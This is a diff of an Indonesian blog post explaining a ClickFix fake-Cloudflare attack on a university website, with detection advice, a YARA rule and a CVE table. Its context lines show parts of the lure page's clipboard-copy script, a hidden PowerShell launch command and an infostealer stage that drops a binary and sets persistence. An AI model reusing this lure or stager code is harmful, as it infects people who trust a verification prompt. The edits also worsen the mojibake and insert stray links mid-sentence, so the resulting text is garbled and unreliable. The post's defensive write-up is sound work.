@@ -5,7 +5,7 @@ date = 2026-07-04T00:00:00.000Z
 description = "Kronologi pengalaman saya menemukan serangan Cloudflare ClixFix di website universitas unirow.ac.id, lengkap dengan analisis kode dan cara pencegahannya"
 title = "Cloudflare ClixFix: Serangan Social Engineering yang Menyerang Website Kampus"
 +++
-Saat saya sedang browsing website kampus **unirow.ac.id** untuk keperluan kuliah, tiba-tiba saya disuguhkan halaman verifikasi Cloudflare yang familiar. Tapi ada yang aneh Ã¢ÂÂ halaman ini meminta saya menekan **Windows + R**, lalu **Ctrl + V** dan **Enter**.
+Saat saya sedang browsing website kampus **unirow.ac.id** untuk keperluan kuliah, tiba-tiba saya disuguhkan halaman verifikasi Cloudflare yang familiar. Tapi ada yang aneh [unirow.ac.id](unirow.ac.id) halaman ini meminta saya menekan **Windows + R**, lalu **Ctrl + V** dan **Enter**.
 
 Bukan captcha biasa. Ini serangan **ClickFix**.
 
@@ -21,7 +21,7 @@ Teknik ini pertama kali didokumentasikan oleh **Proofpoint** pada April 2024 dan
 2. Halaman palsu menampilkan **fake Cloudflare Turnstile** atau **reCAPTCHA**
 3. Saat pengguna klik "Verify", JavaScript diam-diam menyalin perintah berbahaya ke **clipboard**
 4. Halaman menampilkan instruksi: *"Tekan Win+R, Ctrl+V, Enter untuk verifikasi"*
-5. Pengguna menjalankan perintah tanpa sadar Ã¢ÂÂ **malware terinstall**
+5. Pengguna menjalankan perintah tanpa sadar **malware terinstall**
 
 ## Kronologi di unirow.ac.id
 
@@ -30,9 +30,9 @@ Kronologi yang saya alami:
 1. Saya buka `https://unirow.ac.id` seperti biasa
 2. Halaman tidak langsung muncul, melainkan muncul **pop-up Cloudflare verifikasi**
 3. Saya perhatikan ada tombol **"Verify"** dengan tulisan kecil instruksi
-4. Instruksi meminta saya menekan **Win+R Ã¢ÂÂ Ctrl+V Ã¢ÂÂ Enter**
+4. Instruksi meminta saya menekan **Win+R Ctrl+V  Enter**
 5. Saya curiga karena **Cloudflare asli tidak pernah meminta hal ini**
-6. Saya cek source code halaman Ã¢ÂÂ ternyata ada script berbahaya yang menyalin payload ke clipboard
+6. Saya cek source code halaman [unirow.ac.id](unirow.ac.id) ternyata ada script berbahaya yang menyalin payload ke clipboard
 7. Saya **tidak menjalankan** perintah tersebut
 
 Website universitas kemungkinan besar menjadi korban dari kampanye massal yang menyerang **700+ website pendidikan dan teknologi** (dilaporkan oleh Malwarebytes, Mei 2026) melalui celah keamanan **Ghost CMS** (CVE-2026-26980).
@@ -73,7 +73,7 @@ Website universitas kemungkinan besar menjadi korban dari kampanye massal yang m
 </head>
 <body>
   <div class="cf-box">
-    <h2>Ã¢ÂÂÃ¯Â¸Â Cloudflare Security Check</h2>
+    <h2>ÃÂ¢ÃÂÃÂÃÂ¯ÃÂ¸ÃÂ Cloudflare Security Check</h2>
     <p>Silakan verifikasi bahwa Anda manusia untuk melanjutkan</p>
     <button class="verify-btn" onclick="copyPayload()">Verify you are human</button>
     <div class="steps">
@@ -98,7 +98,7 @@ Website universitas kemungkinan besar menjadi korban dari kampanye massal yang m
     function copyPayload() {
       // Salin perintah berbahaya ke clipboard
       navigator.clipboard.writeText(maliciousCmd).then(function() {
-        alert('Berhasil! Sekarang Win+R Ã¢ÂÂ Ctrl+V Ã¢ÂÂ Enter');
+        alert('Berhasil! Sekarang Win+R ÃÂ¢ÃÂÃÂ Ctrl+V ÃÂ¢ÃÂÃÂ Enter');
       });
     }
   </script>
@@ -140,7 +140,7 @@ powershell -w h -ep bypass -f $p
 
 ```powershell
 # === STAGE 2: INFO-STEALER ===
-# Decode base64 Ã¢ÂÂ drop binary Ã¢ÂÂ persistence
+# Decode base64 ÃÂ¢ÃÂÃÂ drop binary ÃÂ¢ÃÂÃÂ persistence
 
 # Buat folder tersembunyi
 $dir = "$env:APPDATA\Microsoft\Windows\Templates"
@@ -218,15 +218,15 @@ rule ClickFix_Cloudflare_Fake {
 | CVE | Target | Dampak |
 |-----|--------|--------|
 | CVE-2026-26980 | Ghost CMS | 700+ website dikompromikan untuk distribusi ClickFix |
-| CVE-2024-28000 | LiteSpeed Cache (WordPress) | Privilege escalation Ã¢ÂÂ admin Ã¢ÂÂ inject ClickFix |
-| CVE-2024-2879 | LayerSlider (WordPress) | SQL injection Ã¢ÂÂ admin creation Ã¢ÂÂ inject ClickFix |
-| CVE-2023-40000 | LiteSpeed Cache (WordPress) | Stored XSS Ã¢ÂÂ inject ClickFix |
+| CVE-2024-28000 | LiteSpeed Cache (WordPress) | Privilege escalation ÃÂ¢ÃÂÃÂ admin ÃÂ¢ÃÂÃÂ inject ClickFix |
+| CVE-2024-2879 | LayerSlider (WordPress) | SQL injection ÃÂ¢ÃÂÃÂ admin creation ÃÂ¢ÃÂÃÂ inject ClickFix |
+| CVE-2023-40000 | LiteSpeed Cache (WordPress) | Stored XSS ÃÂ¢ÃÂÃÂ inject ClickFix |
 
 ## Cara Mendeteksi
 
 1. **Jangan pernah** jalankan perintah yang disalin dari website yang tidak kamu ketahui asalnya
-2. **Cek clipboard** Ã¢ÂÂ kalau kamu tekan Ctrl+V dan muncul perintah PowerShell, **stop**
-3. **Perhatikan URL** Ã¢ÂÂ domain harus benar, bukan redirect atau subdomain aneh
+2. **Cek clipboard** ÃÂ¢ÃÂÃÂ kalau kamu tekan Ctrl+V dan muncul perintah PowerShell, **stop**
+3. **Perhatikan URL** ÃÂ¢ÃÂÃÂ domain harus benar, bukan redirect atau subdomain aneh
 4. **Cloudflare asli tidak pernah** meminta kamu menjalankan perintah apapun
 5. Gunakan **EDR/antivirus** yang mendeteksi anomali PowerShell
 
@@ -247,4 +247,4 @@ rule ClickFix_Cloudflare_Fake {
 
 ---
 
-> **Kesimpulan**: ClickFix menyerang karena manusia adalah link terlemah dalam keamanan siber. Website kampus seperti unirow.ac.id rentan karena sering menggunakan CMS dengan plugin yang belum diupdate. Selalu waspada Ã¢ÂÂ **Cloudflare tidak pernah meminta kamu menjalankan perintah apapun**.
+> **Kesimpulan**: ClickFix menyerang karena manusia adalah link terlemah dalam keamanan siber. Website kampus seperti unirow.ac.id rentan karena sering menggunakan CMS dengan plugin yang belum diupdate. Selalu waspada ÃÂ¢ÃÂÃÂ **Cloudflare tidak pernah meminta kamu menjalankan perintah apapun**.
